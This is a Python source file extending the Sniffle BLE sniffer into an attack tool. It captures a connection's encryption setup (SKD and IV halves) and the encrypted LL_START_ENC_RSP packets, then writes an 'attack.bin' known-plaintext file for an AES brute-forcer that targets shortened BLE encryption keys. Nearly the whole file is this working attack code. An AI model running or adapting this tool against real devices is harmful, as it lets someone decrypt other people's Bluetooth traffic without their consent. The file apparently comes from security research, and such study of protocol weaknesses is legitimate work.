#!/usr/bin/env python3
# Written by Sultan Qasim Khan
# Copyright (c) 2020-2025, NCC Group plc
# Released as open source under GPLv3
#
# Extended with BL3C v3 attack.bin generation by MitBLE project.
# Captures both encrypted LL_START_ENC_RSP PDUs from a passive sniff session
# and writes attack.bin compatible with aes_bruteforcer_ble_asm.

import argparse, sys
from binascii import unhexlify
from pathlib import Path
from datetime import datetime
import os

from sniffle.constants import BLE_ADV_AA
from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import (make_sniffle_hw, PacketMessage, DebugMessage, StateMessage,
                                MeasurementMessage, SnifferMode, PhyMode)
from sniffle.packet_decoder import (AdvaMessage, AdvDirectIndMessage, AdvExtIndMessage,
                                    ScanRspMessage, DataMessage, LlControlMessage,
                                    LlDataContMessage, str_mac, DPacketMessage)
from sniffle.errors import UsageError, SourceDone

try:
    from sniffle.advdata.decoder import decode_adv_data
    _HAS_ADVDATA = True
except ImportError:
    _HAS_ADVDATA = False

# Inlined from mitble_help.py — pure Python, no Crypto dependency needed here.
def make_ble_ccm_nonce(iv: bytes, packet_counter: int, direction_bit: int) -> bytes:
    """Construct the 13-byte BLE CCM nonce (LSO→MSO order, same as NimBLE)."""
    n0 = (packet_counter >> 0) & 0xFF
    n1 = (packet_counter >> 8) & 0xFF
    n2 = (packet_counter >> 16) & 0xFF
    n3 = (packet_counter >> 24) & 0xFF
    pc_high7 = (packet_counter >> 32) & 0x7F
    n4 = pc_high7 | (direction_bit << 7)
    return bytes([n0, n1, n2, n3, n4]) + iv

def make_ble_ccm_counter_block(nonce: bytes, block_index: int) -> bytes:
    """Construct the 16-byte AES-CTR counter block A_i for BLE CCM."""
    flags   = 0x01          # L-1 = 1  (L=2 for BLE)
    ctr_msb = (block_index >> 8) & 0xFF
    ctr_lsb = block_index & 0xFF
    return bytes([flags]) + nonce + bytes([ctr_msb, ctr_lsb])

# ---------------------------------------------------------------------------
# Global sniffer state
# ---------------------------------------------------------------------------
hw = None
pcwriter = None

# Encryption session state
link_encryption_active = False
enc_ctr_p_to_c = 0        # counter for P→C (data_dir == 1 in Sniffle)
enc_ctr_c_to_p = 0        # counter for C→P (data_dir == 0 in Sniffle)
last_sn_p_to_c = None
last_sn_c_to_p = None
last_pdu_p_to_c = None
last_pdu_c_to_p = None

ivm_from_c = None         # 4-byte IVm from LL_ENC_REQ
ivs_from_p = None         # 4-byte IVs from LL_ENC_RSP
iv_real_cp = None         # combined 8-byte IV = IVm || IVs

skdm_from_c = None        # 8-byte SKDm from LL_ENC_REQ
skds_from_p = None        # 8-byte SKDs from LL_ENC_RSP
skd_real_cp = None        # combined 16-byte SKD = SKDm || SKDs

# BL3C attack.bin capture state
enc_rsp_obs_p_to_c = None
enc_rsp_obs_c_to_p = None
attack_bin_written = False

# Output paths
EXPERIMENTS_DIR = Path(__file__).resolve().parent / "bruteforcer" / "experiments"
EXPERIMENTS_DIR.mkdir(parents=True, exist_ok=True)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _hx(b: bytes) -> str:
    return ''.join(f'{x:02x}' for x in b)


def _xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _pad16(data: bytes) -> bytes:
    return data + b"\x00" * (16 - len(data))


def create_experiment_dir() -> Path:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    pid = os.getpid()
    exp_dir = EXPERIMENTS_DIR / f"{timestamp}_{pid}"
    exp_dir.mkdir(parents=True, exist_ok=False)
    return exp_dir


def _extract_skd_iv_from_ll_enc_req(ctrl: LlControlMessage):
    """Returns (skdm: bytes[8], ivm: bytes[4]) from LL_ENC_REQ body."""
    body = ctrl.body
    if ctrl.opcode != 0x03 or len(body) < 23:
        return None, None
    skdm = body[-12:-4]   # 8 bytes
    ivm  = body[-4:]      # 4 bytes
    return skdm, ivm


def _extract_skd_iv_from_ll_enc_rsp(ctrl: LlControlMessage):
    """Returns (skds: bytes[8], ivs: bytes[4]) from LL_ENC_RSP body."""
    body = ctrl.body
    if ctrl.opcode != 0x04 or len(body) < 13:
        return None, None
    skds = body[-12:-4]   # 8 bytes
    ivs  = body[-4:]      # 4 bytes
    return skds, ivs


def build_ccm_observation(pdu: bytes, iv: bytes,
                           packet_counter: int,
                           direction_bit: int) -> dict | None:
    """
    Build a BL3C CCM observation from a captured encrypted LL_START_ENC_RSP.

    Known plaintext: 0x06 (1 byte, LL_START_ENC_RSP opcode)
    AAD: 0x03 (masked LL control header after zeroing NESN/SN/MD bits)

    pdu format: [hdr0][length][encrypted_byte(s)][encrypted_MIC(4)]
    """
    MIC_LEN   = 4
    PLAINTEXT = bytes([0x06])
    AAD_BYTE  = 0x03

    if len(pdu) < 2:
        return None
    length = pdu[1]
    if len(pdu) < 2 + length or length < 1 + MIC_LEN:
        return None

    payload_plus_mic  = pdu[2:2 + length]
    encrypted_payload = payload_plus_mic[:-MIC_LEN]   # 1 byte
    encrypted_mic     = payload_plus_mic[-MIC_LEN:]   # 4 bytes

    nonce = make_ble_ccm_nonce(iv, packet_counter, direction_bit)
    a0    = make_ble_ccm_counter_block(nonce, block_index=0)
    a1    = make_ble_ccm_counter_block(nonce, block_index=1)

    b0        = bytes([0x49]) + nonce + len(PLAINTEXT).to_bytes(2, "big")
    aad_block = bytes([0x00, 0x01, AAD_BYTE]) + b"\x00" * 13

    plaintext_block = _pad16(PLAINTEXT)
    keystream       = _pad16(_xor_bytes(PLAINTEXT, encrypted_payload))

    return {
        "payload_len":       len(PLAINTEXT),
        "a1":                a1,
        "keystream":         keystream,
        "b0":                b0,
        "aad_block":         aad_block,
        "plaintext_block":   plaintext_block,
        "a0":                a0,
        "encrypted_mic":     encrypted_mic,
        # debug
        "nonce":             nonce,
        "encrypted_payload": encrypted_payload,
    }


def write_attack_bin_ccm(exp_dir: Path, key_size: int, skd: bytes, observations: list) -> Path:
    """Write BL3C v3 attack.bin (same binary format as test.py --mode ccm)."""
    if not (1 <= len(observations) <= 4):
        raise ValueError("BL3C v3 requires 1-4 observations")
    if len(skd) != 16:
        raise ValueError("SKD must be 16 bytes")

    out = bytearray()
    out += b"BL3C"
    out += bytes([key_size, len(observations), 0, 0])
    out += skd
    for obs in observations:
        out += bytes([obs["payload_len"], 0, 0, 0])
        out += obs["a1"]
        out += obs["keystream"]
        out += obs["b0"]
        out += obs["aad_block"]
        out += obs["plaintext_block"]
        out += obs["a0"]
        out += obs["encrypted_mic"]

    attack_path = exp_dir / "attack.bin"
    attack_path.write_bytes(bytes(out))

    print(f"\n[BL3C] *** attack.bin written to {attack_path} ***")
    print(f"[BL3C]   key_size={key_size}, observations={len(observations)}")
    print(f"[BL3C]   SKD (AES-input order): {_hx(skd)}")
    for i, obs in enumerate(observations, 1):
        print(f"[BL3C]   obs{i}: nonce={_hx(obs['nonce'])}  "
              f"enc_payload={_hx(obs['encrypted_payload'])}  "
              f"enc_mic={_hx(obs['encrypted_mic'])}")
    print(f"[BL3C] Run:")
    print(f"[BL3C]   ./aes_bruteforcer_ble_asm {attack_path} 1\n")
    return attack_path


def maybe_emit_attack_bin(key_size: int):
    """Emit attack.bin as soon as both LL_START_ENC_RSP observations are ready."""
    global enc_rsp_obs_p_to_c, enc_rsp_obs_c_to_p, attack_bin_written, skd_real_cp

    if attack_bin_written:
        return
    if enc_rsp_obs_p_to_c is None or enc_rsp_obs_c_to_p is None:
        return
    if skd_real_cp is None:
        print("[BL3C] Both observations captured but SKD not yet known – cannot write attack.bin")
        return

    # SKD in AES-input order (same as RM_linux_SC.py convention)
    skd_for_aes = skd_real_cp[::-1]
    observations = [enc_rsp_obs_p_to_c, enc_rsp_obs_c_to_p]

    exp_dir = create_experiment_dir()
    try:
        write_attack_bin_ccm(exp_dir, key_size, skd_for_aes, observations)
        attack_bin_written = True
    except Exception as e:
        print(f"[BL3C] Failed to write attack.bin: {e}")


# ---------------------------------------------------------------------------
# Packet processing
# ---------------------------------------------------------------------------
def process_message(msg, quiet, decode_ad, key_size):
    """Process a decoded packet message, updating encryption state."""
    global link_encryption_active
    global enc_ctr_p_to_c, enc_ctr_c_to_p
    global last_sn_p_to_c, last_sn_c_to_p
    global last_pdu_p_to_c, last_pdu_c_to_p
    global ivm_from_c, ivs_from_p, iv_real_cp
    global skdm_from_c, skds_from_p, skd_real_cp
    global enc_rsp_obs_p_to_c, enc_rsp_obs_c_to_p

    # recv_and_decode() already returns decoded DPacketMessage objects
    dpkt = msg

    if not isinstance(dpkt, DataMessage):
        return

    # -----------------------------------------------------------------------
    # Unencrypted LL control PDU handling
    # -----------------------------------------------------------------------
    if not link_encryption_active and isinstance(dpkt, LlControlMessage):

        # LL_ENC_REQ (opcode 0x03): central → peripheral, carries SKDm + IVm
        if dpkt.opcode == 0x03:
            skdm, ivm = _extract_skd_iv_from_ll_enc_req(dpkt)
            if ivm is not None:
                ivm_from_c = ivm
                print(f"[SE] LL_ENC_REQ  → IVm={_hx(ivm)}  SKDm={_hx(skdm) if skdm else 'err'}")
            if skdm is not None:
                skdm_from_c = skdm

            # Combine when both halves are available
            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
                iv_real_cp = ivm_from_c + ivs_from_p
                print(f"[SE] Combined IV  = {_hx(iv_real_cp)}")
            if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
                skd_real_cp = skdm_from_c + skds_from_p
                print(f"[SE] Combined SKD = {_hx(skd_real_cp)}")

        # LL_ENC_RSP (opcode 0x04): peripheral → central, carries SKDs + IVs
        elif dpkt.opcode == 0x04:
            skds, ivs = _extract_skd_iv_from_ll_enc_rsp(dpkt)
            if ivs is not None:
                ivs_from_p = ivs
                print(f"[SE] LL_ENC_RSP  → IVs={_hx(ivs)}  SKDs={_hx(skds) if skds else 'err'}")
            if skds is not None:
                skds_from_p = skds

            # Combine when both halves are available
            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
                iv_real_cp = ivm_from_c + ivs_from_p
                print(f"[SE] Combined IV  = {_hx(iv_real_cp)}")
            if skdm_from_c is not None and skds_from_p is not None and skd_real_cp is None:
                skd_real_cp = skdm_from_c + skds_from_p
                print(f"[SE] Combined SKD = {_hx(skd_real_cp)}")

        # LL_START_ENC_REQ (opcode 0x05): signals that the next PDUs are encrypted
        elif dpkt.opcode == 0x05:
            link_encryption_active = True
            enc_ctr_p_to_c = 0
            enc_ctr_c_to_p = 0
            last_sn_p_to_c = None
            last_sn_c_to_p = None
            last_pdu_p_to_c = None
            last_pdu_c_to_p = None
            enc_rsp_obs_p_to_c = None
            enc_rsp_obs_c_to_p = None
            print("[SE] LL_START_ENC_REQ seen – encryption starting, waiting for LL_START_ENC_RSP pair")

    # -----------------------------------------------------------------------
    # Encrypted phase: capture LL_START_ENC_RSP (1st = C→P, 2nd = P→C)
    # -----------------------------------------------------------------------
    elif link_encryption_active:
        pdu = dpkt.body
        if len(pdu) < 2:
            return

        hdr0        = pdu[0]
        length      = pdu[1]
        has_payload = (length > 0)
        llid        = hdr0 & 0x03

        if not has_payload:
            return

        # Check if this is an encrypted control packet (LLID == 3 or LL Control)
        # LL_START_ENC_RSP has payload length 5 (1 byte encrypted opcode + 4 byte MIC)
        if llid == 3 or isinstance(dpkt, LlControlMessage):
            if enc_rsp_obs_c_to_p is None:
                # 1st encrypted control PDU: Central to Peripheral (direction_bit = 1)
                packet_counter = 0
                print(f"[ENC] 1st encrypted control PDU – capturing C→P LL_START_ENC_RSP")
                if iv_real_cp is not None:
                    obs = build_ccm_observation(pdu, iv_real_cp, packet_counter, direction_bit=1)
                    if obs is not None:
                        enc_rsp_obs_c_to_p = obs
                        print(f"[BL3C] Captured C→P LL_START_ENC_RSP observation")
                        maybe_emit_attack_bin(key_size)
                    else:
                        print("[BL3C] WARNING: could not parse C→P LL_START_ENC_RSP PDU")
                else:
                    print("[BL3C] WARNING: C→P encrypted control PDU seen but IV not yet known")

            elif enc_rsp_obs_p_to_c is None:
                # 2nd encrypted control PDU: Peripheral to Central (direction_bit = 0)
                packet_counter = 0
                print(f"[ENC] 2nd encrypted control PDU – capturing P→C LL_START_ENC_RSP")
                if iv_real_cp is not None:
                    obs = build_ccm_observation(pdu, iv_real_cp, packet_counter, direction_bit=0)
                    if obs is not None:
                        enc_rsp_obs_p_to_c = obs
                        print(f"[BL3C] Captured P→C LL_START_ENC_RSP observation")
                        maybe_emit_attack_bin(key_size)
                    else:
                        print("[BL3C] WARNING: could not parse P→C LL_START_ENC_RSP PDU")
                else:
                    print("[BL3C] WARNING: P→C encrypted control PDU seen but IV not yet known")


# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------
def print_message(msg, quiet, decode_ad):
    # recv_and_decode() returns already-decoded DPacketMessage/DebugMessage/etc.
    if isinstance(msg, PacketMessage):
        print_packet(msg, quiet, decode_ad)
    elif isinstance(msg, (DebugMessage, StateMessage, MeasurementMessage)):
        print(msg, end='\n\n')


def print_packet(dpkt, quiet, decode_ad):
    if isinstance(dpkt, (AdvaMessage, AdvDirectIndMessage, ScanRspMessage, AdvExtIndMessage)):
        print(dpkt.str_header())
        print(dpkt.str_decode())
        if decode_ad and _HAS_ADVDATA:
            from sniffle.advdata.decoder import decode_adv_data
            for ad in decode_adv_data(dpkt.adv_data):
                print(ad)
        print(dpkt.hexdump(), end='\n\n')
    elif not (quiet and isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0):
        print(dpkt, end='\n\n')

    if pcwriter:
        pcwriter.write_packet_message(dpkt)


def get_mac_from_string(s, coded_phy=False):
    hw.setup_sniffer(SnifferMode.ACTIVE_SCAN, ext_adv=True, coded_phy=coded_phy)
    hw.mark_and_flush()
    while True:
        msg = hw.recv_and_decode()
        dpkt = DPacketMessage.decode(msg) if isinstance(msg, PacketMessage) else None
        if dpkt is not None and isinstance(dpkt, (AdvaMessage, AdvDirectIndMessage,
                                                   ScanRspMessage, AdvExtIndMessage)):
            if getattr(dpkt, 'AdvA', None) is not None and s in dpkt.body:
                return dpkt.AdvA, not dpkt.TxAdd


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    aparse = argparse.ArgumentParser(description="Passive BLE sniffer with BL3C attack.bin capture")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-b", "--baudrate", default=None, help="Sniffer serial port baud rate")
    aparse.add_argument("-c", "--advchan", default=40, choices=[37, 38, 39], type=int,
            help="Advertising channel to listen on")
    aparse.add_argument("-p", "--pause", action="store_true",
            help="Pause sniffer after disconnect")
    aparse.add_argument("-r", "--rssi", default=-128, type=int,
            help="Filter packets by minimum RSSI")
    aparse.add_argument("-m", "--mac", default=None, help="Filter packets by advertiser MAC")
    aparse.add_argument("-i", "--irk", default=None, help="Filter packets by advertiser IRK")
    aparse.add_argument("-S", "--string", default=None,
            help="Filter for advertisements containing the specified string")
    aparse.add_argument("-a", "--advonly", action="store_true",
            help="Passive scanning, don't follow connections")
    aparse.add_argument("-A", "--scan", action="store_true",
            help="Active scanning, don't follow connections")
    aparse.add_argument("-e", "--extadv", action="store_true",
            help="Capture BT5 extended (auxiliary) advertising")
    aparse.add_argument("-H", "--hop", action="store_true",
            help="Hop primary advertising channels in extended mode")
    aparse.add_argument("-l", "--longrange", action="store_true",
            help="Use long range (coded) PHY for primary advertising")
    aparse.add_argument("-q", "--quiet", action="store_true",
            help="Don't display empty packets")
    aparse.add_argument("-Q", "--preload", default=None,
            help="Preload expected encrypted connection parameter changes")
    aparse.add_argument("-n", "--nophychange", action="store_true",
            help="Ignore encrypted PHY mode changes")
    aparse.add_argument("-C", "--crcerr", action="store_true",
            help="Capture packets with CRC errors")
    aparse.add_argument("-d", "--decode", action="store_true",
            help="Decode advertising data")
    aparse.add_argument("-f", "--file-input", default=None, help="Input PCAP file to process offline")
    aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
    aparse.add_argument("-k", "--key-size", type=int, default=7,
            help="Assumed brute-force key size in bytes (default: 7)")
    args = aparse.parse_args()

    if not (1 <= args.key_size <= 16):
        raise UsageError("key-size must be between 1 and 16")

    print(f"[BL3C] key_size={args.key_size} – will capture LL_START_ENC_RSP pair and write attack.bin")
    print(f"[BL3C] Output directory: {EXPERIMENTS_DIR}\n")

    # If PCAP input file is specified, process offline and exit
    if args.file_input:
        from sniffle.pcap import PcapBleReader
        print(f"[BL3C] Reading PCAP input file: {args.file_input}")
        pcreader = PcapBleReader(args.file_input)
        for pkt in pcreader:
            process_message(pkt, args.quiet, args.decode, args.key_size)
            print_message(pkt, args.quiet, args.decode)
        return

    # Sanity check for live sniffing
    targ_specs = bool(args.mac) + bool(args.irk) + bool(args.string)
    if args.hop and targ_specs < 1:
        raise UsageError("Primary adv. channel hop requires a target MAC, IRK, or ad string!")
    if args.longrange and args.hop:
        raise UsageError("Primary ad channel hopping unsupported on long range PHY!")
    if targ_specs > 1:
        raise UsageError("MAC, IRK, and advertisement string filters are mutually exclusive!")
    if args.advchan != 40 and args.hop:
        raise UsageError("Don't specify an advertising channel if you want channel hopping!")
    if not (1 <= args.key_size <= 16):
        raise UsageError("key-size must be between 1 and 16")

    global hw
    hw = make_sniffle_hw(args.serport, baudrate=args.baudrate)

    hop3 = True if targ_specs else False
    if args.advchan == 40:
        args.advchan = 37
    else:
        hop3 = False

    if args.extadv and not args.hop:
        hop3 = False

    mac = None
    irk = None
    if args.irk:
        irk = unhexlify(args.irk)
    elif args.mac:
        try:
            mac = [int(h, 16) for h in reversed(args.mac.split(":"))]
        except Exception:
            raise UsageError("MAC must be 6 colon-separated hex bytes")
    elif args.string:
        search_str = args.string.encode('latin-1').decode('unicode_escape').encode('latin-1')
        print("Waiting for advertisement containing specified string...")
        mac, _ = get_mac_from_string(search_str, args.longrange)
        print("Found target MAC: %s" % str_mac(mac))

    preload_pairs = []
    if args.preload:
        for tstr in args.preload.split(','):
            tsplit = tstr.split(':')
            preload_pairs.append((int(tsplit[0]), int(tsplit[1])))

    if args.scan:
        sniffer_mode = SnifferMode.ACTIVE_SCAN
    elif args.advonly:
        sniffer_mode = SnifferMode.PASSIVE_SCAN
    else:
        sniffer_mode = SnifferMode.CONN_FOLLOW

    hw.setup_sniffer(
            mode=sniffer_mode,
            chan=args.advchan,
            targ_mac=mac,
            targ_irk=irk,
            hop3=hop3,
            ext_adv=args.extadv,
            coded_phy=args.longrange,
            rssi_min=args.rssi,
            interval_preload=preload_pairs,
            phy_preload=None if args.nophychange else PhyMode.PHY_2M,
            pause_done=args.pause,
            validate_crc=not args.crcerr)

    hw.mark_and_flush()

    global pcwriter
    if args.output is not None:
        pcwriter = PcapBleWriter(args.output)

    print(f"[BL3C] key_size={args.key_size} – will capture LL_START_ENC_RSP pair and write attack.bin")
    print(f"[BL3C] Output directory: {EXPERIMENTS_DIR}\n")

    while True:
        try:
            msg = hw.recv_and_decode()
            process_message(msg, args.quiet, args.decode, args.key_size)
            print_message(msg, args.quiet, args.decode)
        except SourceDone:
            break
        except KeyboardInterrupt:
            hw.cancel_recv()
            sys.stderr.write("\r")
            break


if __name__ == "__main__":
    main()
